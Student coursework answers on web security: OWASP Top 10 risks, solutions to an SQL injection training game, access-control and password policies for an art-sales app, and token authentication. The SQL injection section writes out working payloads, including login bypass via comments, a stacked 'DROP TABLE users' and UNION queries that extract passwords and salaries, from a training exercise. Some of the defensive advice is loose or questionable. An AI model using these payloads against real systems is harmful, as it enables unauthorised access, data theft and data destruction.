# Exercicis PR1 Seguretat i vulnerabilitat

## 1. L’organització OWASP Foundation va actualitzar en 2021 el seu Top 10 de vulnerabilitats més trobades en aplicacions web.

__Escull 3 vulnerabilitats d’aquesta llista i descriu-les. Escriu l’impacte que tenen a la seguretat i quins danys pot arribar a fer un atac en aquesta vulnerabilitat. Enumera diferents mesures i tècniques per poder evitar-les.__

**Sensitive data Exposure o exposición de datos vulnerables en español**
*Qué es?*
    El término se refiere a aplicaciones que exponen datos personales de los usuarios o de la propia empresa asi como su nombre de usuario, contraseña o hasta gastos bancarios.
*Qué impacto puede llegar a tener?*
    Esta vulnerabiidad puede llegar a afectar tanto a páginas web, como a redes wifi o incluso redes internas por eso es que es tan peligrosa.
    Los atacantes pueden utilizar esta vulnerabilidad para llegar a escanear todas las páginas hasta encontrar los datos que les den acceso no autorizado. 
*Cómo lo evito?*
    Para evitar estos problemas hay varias maneras de comprobar que no haya problemas de este tipo como por ejemplo utilizando 'Google Dorks'.

**Insuficient Logging or monitoring o registro y monitoreo insuficiente**
*Qué es?*
    Este riesgo se refiera a la falta de registro en caso de actividades como loggings, fallos del sistema, etc y que los mensajes de alertas sean poco descriptivos.
*Qué impacto tiene?*
    Un atacante podria usar un diccionario de datos para intentar entrar en tu aplicación y si no se detecta a tiempo puede llegar a entrar. 
*Cómo lo evito?*
    Para evitar que esto pase normalmente se usan sistemas de monitoreo y se registran las actvidades sospechosas como los procesos de alto impacto, etc.

**XML external Entity o Xml entidad externa de XML**
*Qué es?*
    Se refiere a un riesgo en una aplicación que analizan entrada de archivos XML. Si el parser usa entidades externas el atacante puede modificar esas entidades.
*Qué impacto tiene?*
    El atacante puede llegar a obtener información local, puede enumerar puertos abiertos, ips e incluso dominios. En caso de que el servidor tenga el módulo expect PHP el atacante puede llegar a ejecutar código en la entidad, incluso llegar a tener acceso a una máquina a traves de él. Para evitar esto.
*Cómo lo evito?*
    Esto se puede prevenir validando todos los inputs y en caso de no usar los DTDs deshabilitarlos completamente.

## 2. Obre el següent enllaç (sql inseckten) i realitza un mínim de 7 nivells fent servir tècniques d’injecció SQL. 

__Copia cada una de les sentències SQL resultant que has realitzat a cada nivell i comenta que has aconseguit.__

__Nivel 1:__
SELECT username 
FROM users 
WHERE username ='jane'--' AND password ='d41d8cd98f00b204e9800998ecf8427e';
En este nivel lo que ha pasado es que poniendo ‘--’ se comenta todo el código que viene después del nombre y nos deja entrar sin contraseña.

__Nivel 2:__
SELECT username 
FROM users 
WHERE username ='';DROP TABLE users;--' AND password ='d41d8cd98f00b204e9800998ecf8427e';
Lo que ha pasado aquí es que hemos marcado el final de un comando para crear uno nuevo y luego comentar lo demás lo cual nos permite hacer lo que queramos.

__Nivel 3:__
SELECT username 
FROM users 
WHERE username ='' OR 1=1; --' AND password ='d41d8cd98f00b204e9800998ecf8427e'
En este nivel lo que hacemos es que nos deje entrar ya que creamos una nueva condición que siempre será verdadera

__Nivel 4:__
SELECT username 
FROM users 
WHERE username ='' OR 1=1 ORDER BY user_id LIMIT 1 --' AND password ='d41d8cd98f00b204e9800998ecf8427e';
En este lo que ha pasado es que simplemente hemos añadido una línea para hacer que el resultado se limite a una línea

__Nivel 5:__
SELECT product_id, brand, size, price 
FROM shoes 
WHERE brand='' UNION select username, password from users; --';
Aquí lo que hacemos es hacer un doble select, por eso utilizamos UNION para que nos muestre el usuario y la contraseña de los usuarios

__Nivel 6:__
SELECT username 
FROM users 
WHERE username ='' UNION SELECT s.salary AS staff_salary FROM staff s WHERE s.firstname = 'Greta Maria' -- ' AND password ='d41d8cd98f00b204e9800998ecf8427e';
En este nivel utilizamos el mismo método que el anterior pero con más información para obtener en este caso el salario de Greta Maria

__Nivel 7:__
SELECT product_id, brand, size, price 
FROM shoes 
WHERE brand='' UNION SELECT name, email, salary, employed_since FROM staff where ‘’ = ‘';
En este nivel el punto y coma esta prohibido así que hemos tenido que utilizar el que ya estaba puesto por defecto y como anteriormente un UNION para que lo haga todo seguido sin necesidad del punto y coma

 __Enumera i raona diferents formes que pot evitar un atac per SQL injection en projectes fets amb Razor Pages i Entity Framework.__

1. Validar todas las entradas
Para evitar que los atacantes inyecten el texto que ellos quieran validar las entradas es una buena opción, como por ejemplo podríamos crear una lista de texto permitido para asegurar la seguridad de nuestra aplicación.
		2. Restringir los permisos de la base de datos o de la aplicación
También podríamos optar por la opción de simplemente no darle los permisos para ejecutar nada que no queramos nosotros o utilizar procedimientos almacenados

## 3. L’empresa a la qual treballes desenvoluparà una aplicació web de venda d’obres d’art. Els artistes registren les seves obres amb fotografies, títol, descripció i preu.  Els clients poden comprar les obres i poden escriure ressenyes públiques dels artistes a qui han comprat. Tant clients com artistes han d’estar registrats. L’aplicació guarda nom, cognoms, adreça completa, dni i telèfon. En el cas dels artistes guarda les dades bancaries per fer els pagaments. Hi ha un tipus d’usuari Acount Manager que s’encarrega de verificar als nous artistes. Un cop aprovats poden pública i vendre les seves obres.

__Ara es vol aplicar aplicant els principis  de seguretat per tal de garantir el servei i la integritat de les dades. T’han encarregat l'elaboració de part de les polítiques de seguretat. Elabora els següents apartats:__
- __Definició del control d’accés: enumera els rols  i quin accés a dades tenen cada rol.__
Clientes → solo ver/comprar obras y escribir/ver reseñas
Artistas →permisos de colgar obras y ver reseñas
Account manager → solo permisos para ver los nuevos artistas, aprobar y guardar los datos bancarios

- __Definició de la política de contrasenyes: normes de creació, d’ús i canvi de contrasenyes. Raona si són necessàries diferents polítiques segons el perfil d’usuari:__
**Usuarios/Clientes** →  política básica mínimo 8 carácteres, un número, un carácter especial y una letra. Opción de cambiar la contraseña cuando quieras y en caso de no te acordarte
**Artistas** →  igual que los usuarios pero con cambio de contraseña cada mes, ya que se utiliza información sensible como los datos bancarios
Ya que los artistas tienen que ser valorados por el Account Manager antes de poder entrar es necesario que mantengan la seguridad y que sean recurrentes en la aplicación por eso el cambio de contraseña cada mes. En cambio los usuarios pueden crearse una cuenta y nunca comprar o hacer nada así que no veo necesario tanta seguridad.

- __Avaluació de la informació: determina quin valor tenen les dades que treballa l'aplicació. Determina com tractar les dades més sensibles. Quines dades encriptaries?__
Se guardan algunos datos sensibles como el dni, número de teléfono y la adreça
y luego en caso de los Artistas también guardamos los datos bancarios. Esta información la guardaría en una base de datos segura y encriptará toda la información. En caso de los datos de las obras no veo necesidad de encriptar nada.


## 4. En el control d’accessos, existeixen mètodes d’autenticació basats en tokens. Defineix l’autenticació basada en tokens. Quins tipus hi ha? Com funciona mitjançant la web? Cerca llibreries .Net que ens poden ajudar a implementar autenticació amb tokens.

Los tokens son códigos alfanuméricos contiene en qué páginas está autorizado a entrar y su información personal
__Tipos:__

__Tokens de acceso:__
Son objetos opacos, lo que quiere decir que la aplicación no los puede inspeccionar. Contienen información sobre la persona que creó el token. No contienen la identidad de la persona que lo uso

__Tokens de ID.__
A diferencia de los tokens de acceso estos son tokens web JSON se componen de pares-clave.
Estos tokens se inspeccionan y se usan dentro de la aplicación.
El token contiene la información de quién lo creó y quién lo está usando.

__JWT autofirmados.__
Son tokens que crea la misma persona que lo utiliza y da acceso a algunas APIs en específico.
Tokens de actualización.
Se utiliza para obtener nuevos pares de tokens de acceso y de actualización cuando el token de acceso actual caduca 

__Librerías:__

IdentityServer: es un marco de código abierto que se puede usar para autenticación y autorización con tokens

OpenID:  es una capa de identidad basada en el protocolo OAuth 2.0. OAuth 2 es un protocolo que permite a las aplicaciones solicitar tokens de acceso


## 5. Crea un projecte de consola amb un menú amb tres opcions:
- _Registre_: l’usuari ha d’introduir username i una password. De la combinació dels dos camps guarda en memòria directament l'encriptació. Utilitza l’encriptació de hash HA256. Mostra per pantalla el resultat.
- _Verificació_ de dades: usuari ha de tornar a introduir les dades el programa mostra per pantalla si les dades són correctes.
- _Encriptació_ i desencriptació amb RSA. L’usuari entrarà un text per consola. A continuació mostra el text encriptat i en la següent línia el text desencriptat. L’algoritme de RSA necessita una clau pública per encriptar i una clau privada per desencriptar. No cal guardar-les en memòria persistent.

__Per realitzar aquest exercici utilitza la llibreria System.Security.Cryptography.__

__Indica les referències que has consultat, seguint el següent format:__

Link a l'exercici: 
https://github.com/ITB-DAMv1/m09-t1-pr1-seguretat-i-vulnerabilitat-Laiacastle/tree/main/T1.PR1.SeguretatiVulnerabilitat
